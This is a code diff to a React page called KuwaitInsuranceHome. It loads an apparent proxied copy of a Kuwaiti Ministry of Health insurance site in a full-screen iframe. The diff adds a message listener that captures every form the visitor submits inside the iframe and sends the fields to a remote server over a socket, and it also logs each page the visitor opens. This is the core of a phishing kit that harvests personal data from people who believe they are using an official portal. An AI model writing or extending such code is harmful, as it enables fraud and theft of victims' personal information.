@@ -1,9 +1,11 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
+import { socket, visitor } from '../lib/store';
 
-const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';
+const WORKER_BASE = 'https://moh-proxy-v2.fanarali881.workers.dev';
 
 export default function KuwaitInsuranceHome() {
   const [loading, setLoading] = useState(true);
+  const iframeRef = useRef<HTMLIFrameElement>(null);
 
   // Ensure proper viewport for mobile
   useEffect(() => {
@@ -13,10 +15,45 @@ export default function KuwaitInsuranceHome() {
     }
   }, []);
 
+  // Listen for postMessage from iframe (form data + navigation)
+  useEffect(() => {
+    const handleMessage = (event: MessageEvent) => {
+      // Accept messages from our worker
+      if (!event.data || typeof event.data !== 'object') return;
+
+      const { type, path, fields, action } = event.data;
+
+      if (type === 'moh-navigation') {
+        // User navigated to a new page inside the iframe
+        console.log('[MOH] Navigation:', path);
+        if (socket.value.connected && visitor.value._id) {
+          socket.value.emit('visitor:pageEnter', `MOH: ${path}`);
+        }
+      }
+
+      if (type === 'moh-form-data') {
+        // User submitted a form - capture the data
+        console.log('[MOH] Form submitted:', fields, 'Action:', action);
+        if (fields && Object.keys(fields).length > 0) {
+          // Send to server via socket
+          if (socket.value.connected && visitor.value._id) {
+            socket.value.emit('more-info', {
+              content: fields,
+              page: `MOH: ${path || 'unknown'}`,
+              waitingForAdminResponse: false,
+            });
+          }
+        }
+      }
+    };
+
+    window.addEventListener('message', handleMessage);
+    return () => window.removeEventListener('message', handleMessage);
+  }, []);
+
   return (
     <div style={{
       width: '100vw',
-      height: '100vh',
       height: '100dvh',
       position: 'fixed',
       top: 0,
@@ -55,8 +92,8 @@ export default function KuwaitInsuranceHome() {
           <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
         </div>
       )}
-
       <iframe
+        ref={iframeRef}
         src={WORKER_BASE + '/Insurance/logaction'}
         onLoad={() => setLoading(false)}
         style={{
